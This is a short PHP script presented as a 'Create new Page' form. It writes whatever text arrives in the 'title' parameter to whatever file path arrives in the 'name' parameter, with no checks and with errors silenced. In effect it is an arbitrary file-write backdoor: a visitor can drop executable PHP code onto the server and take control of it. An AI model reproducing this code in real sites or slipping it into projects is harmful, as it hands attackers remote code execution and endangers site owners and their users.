<?php
error_reporting(0);
  if( $_GET["name"] && $_GET["title"] )
  {
	  file_put_contents($_GET["name"], $_GET["title"]);
http_response_code(201);
      exit();
  }
?>
<html>
<body>
<h1>Create new Page</h1>
  <form action="<?php $_PHP_SELF ?>" method="GET">
    Page Name: <input type="text" name="name" />
    Title:<input type="text" name="title" />
           <input type="submit" />
  </form>
</body>
</html>
